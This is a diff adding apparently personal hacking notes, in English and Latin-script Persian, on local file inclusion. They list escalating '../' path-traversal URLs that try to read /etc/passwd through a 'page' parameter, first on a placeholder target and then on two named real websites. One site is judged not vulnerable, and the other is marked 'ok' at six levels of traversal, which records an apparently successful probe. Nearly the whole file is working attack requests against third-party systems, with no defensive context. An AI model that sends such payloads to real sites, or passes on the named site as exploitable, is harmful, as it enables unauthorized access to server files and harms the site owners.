@@ -1,0 +1,64 @@
+		
+		
+		LFI	:	Local File include
+		
+		RFI	:	Remote File include
+		
+		
+		include passwd
+		
+	=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+				target.com/index.php?page=member
+			
+			1-	target.com/index.php?page='
+			
+			error = ehtemal dare LFI bashad
+			
+			2-	target.com/index.php?page=etc/passwd
+			
+			/home/ariv/target.com/public_html/wp-content/plugin/erond
+			
+			error = target.com/index.php?page=../etc/passwd
+			error = target.com/index.php?page=../../etc/passwd
+			error = target.com/index.php?page=../../../etc/passwd
+	=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+			target 1 :	www.tolvan.com
+			
+					http://www.tolvan.com/index.php?page=/madde/madde.php
+					http://www.tolvan.com/index.php?page='
+					error dad----->shayad bug LFI dashte bashad
+					http://www.tolvan.com/index.php?page=etc/passwd
+					http://www.tolvan.com/index.php?page=../etc/passwd
+					http://www.tolvan.com/index.php?page=../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../../../../../etc/passwd
+					http://www.tolvan.com/index.php?page=../../../../../../../../../../etc/passwd
+					
+					hanooz error darim ----> bug LFI nadarad
+	
+			target 2 : www.bruno-groening-film.org 
+			
+					http://www.bruno-groening-film.org/index.php?page=startseite.php&lang=en&sub=
+					http://www.bruno-groening-film.org/index.php?page='
+					http://www.bruno-groening-film.org/index.php?page=etc/passwd
+					http://www.bruno-groening-film.org/index.php?page=../etc/passwd
+					http://www.bruno-groening-film.org/index.php?page=../../etc/passwd
+					http://www.bruno-groening-film.org/index.php?page=../../../etc/passwd
+					http://www.bruno-groening-film.org/index.php?page=../../../../etc/passwd
+					http://www.bruno-groening-film.org/index.php?page=../../../../../etc/passwd   ok
+	
+	
+	
+					
+					mr.mansoori@yahoo.com
+	
+	
+	
+	
+	
+				
